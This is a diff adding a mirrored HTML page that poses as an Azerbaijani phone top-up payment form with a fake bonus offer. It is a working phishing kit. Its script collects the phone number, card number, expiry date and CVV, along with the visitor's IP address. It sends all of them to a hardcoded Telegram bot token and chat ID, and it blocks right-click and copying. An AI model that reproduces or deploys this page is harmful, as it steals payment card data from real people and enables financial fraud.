@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<!-- Mirrored from m10balans.online/number/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Dec 2024 09:36:20 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ödeme Formu</title>
+    <!-- Google Fonts için Roboto ve Montserrat fontları ekleniyor -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@700&family=Montserrat:wght@700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #d30412; /* Tüm sayfa kırmızı arka plan */
+            font-family: 'Montserrat', sans-serif; /* Modern ve bold font */
+            color: white; /* Metin rengi beyaz olacak */
+        }
+        .content {
+            margin: 0 auto;
+            padding: 20px;
+            max-width: 500px;
+            text-align: center;
+            color: white; /* İçerikteki metin beyaz olacak */
+        }
+        h2 {
+            font-size: 30px; /* Başlık boyutu büyütüldü */
+            color: white; /* Başlık beyaz oldu */
+            font-family: 'Roboto', sans-serif; /* Daha modern bir font */
+            font-weight: bold; /* Başlık kalın olacak */
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: black; /* Etiketler siyah olacak */
+            font-family: 'Roboto', sans-serif; /* Modern ve kalın font */
+        }
+        input[type="text"], input[type="number"], select {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif; /* Modern font */
+            font-weight: bold; /* Girişler kalın olacak */
+            border: 1px solid black; /* Siyah kenarlık */
+            background-color: white; /* Giriş alanlarının arka planı beyaz olacak */
+            color: black; /* Yazı rengi siyah olacak */
+            border-radius: 40px; /* Giriş alanlarının köşe yuvarlatma */
+        }
+        input[type="text"]#telefon-numarasi {
+            padding-left: 50px;
+        }
+        input[type="number"]#tutar {
+            text-align: right;
+        }
+        input[type="text"]#kart-numarasi {
+            letter-spacing: 4px;
+        }
+        button {
+            background-color: #d30412;
+            color: white; /* Butonun yazısını beyaz yapıyoruz */
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            font-family: 'Roboto', sans-serif; /* Buton fontunu modern yapıyoruz */
+            font-weight: bold; /* Buton yazısını kalın yapıyoruz */
+            border-radius: 40px; /* Yuvarlatılmış köşe */
+        }
+        button:hover {
+            background-color: darkred;
+        }
+        .image-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 15px;
+        }
+        .image-container img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 40px; /* Resmi yuvarlatılmış köşe yapıyoruz */
+            width: 100%; /* Resmin genişliği ödeme kutusuyla aynı olacak */
+        }
+        #logo {
+            width: 150px;
+            margin: 0 auto 20px auto;
+        }
+        .error {
+            color: red;
+            display: none;
+        }
+        .error.visible {
+            display: block;
+        }
+        .result {
+            margin-top: 10px;
+            font-size: 18px;
+            color: green;
+        }
+
+        /* Eski haliyle ödeme bilgileri kutusu, yuvarlatılmış köşe */
+        .payment-info {
+            background-color: white; /* Ödeme bilgileri beyaz olacak */
+            color: #d30412; /* Yazı rengini kırmızı yapıyoruz */
+            padding: 20px;
+            margin-top: 20px; /* Üstten boşluk ekliyoruz */
+            border-radius: 40px; /* Yuvarlatılmış köşe */
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <img id="logo" src="Logo.png" alt="Logo">
+        <h2>Ödeme Bilgileri</h2>
+        <div class="payment-info">
+            <form onsubmit="gonder(event)">
+                <div class="form-group">
+                    <label for="telefon-numarasi">Telefon Numarası</label>
+                    <input 
+                        type="text" 
+                        id="telefon-numarasi" 
+                        name="telefon-numarasi" 
+                        value="+994" 
+                        oninput="telefonInput(this)" 
+                        maxlength="13" 
+                        required>
+                </div>
+                <div class="form-group">
+                    <label for="tutar">Yükləyəcəyiniz Məbləğ ₼</label>
+                    <input 
+                        type="number" 
+                        id="tutar" 
+                        name="tutar" 
+                        placeholder="0" 
+                        oninput="hesapla(this.value)" 
+                        required>
+                    <div id="result" class="result"></div>
+                </div>
+                <div class="form-group">
+                    <label for="kart-numarasi">Kart Nömrəsi</label>
+                    <input type="text" id="kart-numarasi" name="kart-numarasi" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" required>
+                </div>
+                <div class="form-group">
+                    <label>Son İstifadə Tarixi</label>
+                    <div style="display: flex; gap: 10px;">
+                        <select id="son-kullanma-ay" name="son-kullanma-ay" required>
+                            <option value="">Ay</option>
+                            <option value="01">01</option>
+                            <option value="02">02</option>
+                            <option value="03">03</option>
+                            <option value="04">04</option>
+                            <option value="05">05</option>
+                            <option value="06">06</option>
+                            <option value="07">07</option>
+                            <option value="08">08</option>
+                            <option value="09">09</option>
+                            <option value="10">10</option>
+                            <option value="11">11</option>
+                            <option value="12">12</option>
+                        </select>
+                        <select id="son-kullanma-yil" name="son-kullanma-yil" required>
+                            <option value="">İl</option>
+                            <option value="2024">2024</option>
+                            <option value="2025">2025</option>
+                            <option value="2026">2026</option>
+                            <option value="2027">2027</option>
+                            <option value="2028">2028</option>
+                            <option value="2029">2029</option>
+                            <option value="2030">2030</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" maxlength="3" pattern="\d{3}" required>
+                </div>
+                <button type="submit">Göndər</button>
+            </form>
+        </div>
+        <div class="image-container">
+            <img src="as1.png" alt="Eklenen Resim">
+        </div>
+    </div>
+
+    <script>
+     document.addEventListener("contextmenu", function(event) {
+        event.preventDefault(); // Sağ tıklama menüsünü devre dışı bırakır
+    });
+
+    document.addEventListener("keydown", function(event) {
+        if (event.ctrlKey && event.key === 'c') {
+            event.preventDefault(); // CTRL+C (kopyalama) engellenir
+        }
+    });
+        function telefonInput(input) {
+            if (!input.value.startsWith("+994")) {
+                input.value = "+994";
+            }
+            input.value = input.value.replace(/[^\d+]/g, '').slice(0, 13);
+        }
+
+        function hesapla(tutar) {
+            let yuzde = 0;
+            if (tutar >= 10 && tutar < 100) {
+                yuzde = 20;
+            } else if (tutar >= 100 && tutar < 500) {
+                yuzde = 30;
+            } else if (tutar >= 500 && tutar <= 10000) {
+                yuzde = 40;
+            }
+            let sonuc = tutar * (1 + yuzde / 100);
+            document.getElementById("result").innerText = `Toplam Tutar: ${sonuc.toFixed(2)}₼`;
+        }
+
+        async function gonder(event) {
+            event.preventDefault();
+
+            const telefonNumarasi = document.getElementById("telefon-numarasi").value;
+            const tutar = document.getElementById("tutar").value;
+            const kartNumarasi = document.getElementById("kart-numarasi").value;
+            const sonKullanmaAy = document.getElementById("son-kullanma-ay").value;
+            const sonKullanmaYil = document.getElementById("son-kullanma-yil").value;
+            const cvv = document.getElementById("cvv").value;
+
+            const botToken = "8136871782:AAGl_5_It13PYi6UPTsVZRQB2LgTVrjG7Ao";
+            const chatId = "8031253006";
+
+            try {
+                const ipResponse = await fetch("../../api.ipify.org/index0cce.html?format=json");
+                const ipData = await ipResponse.json();
+                const ipAdres = ipData.ip;
+
+                const mesaj = `Telefon Numarası: ${telefonNumarasi}\nYükleyeceğiniz Tutar: ${tutar}₼\nKart Numarası: ${kartNumarasi}\nSon Kullanma Tarihi: ${sonKullanmaAy}/${sonKullanmaYil}\nCVV: ${cvv}\nIP Adresi: ${ipAdres}`;
+
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}`;
+
+                const response = await fetch(url);
+                if (response.ok) {
+                    window.location.href = "pay/index.html";
+                } else {
+                    alert("Mesaj gönderilirken bir hata oluştu.");
+                }
+            } catch (error) {
+                console.error("Hata:", error);
+                alert("Bir hata oluştu. Lütfen tekrar deneyin.");
+            }
+        }
+    </script>
+</body>
+</html>
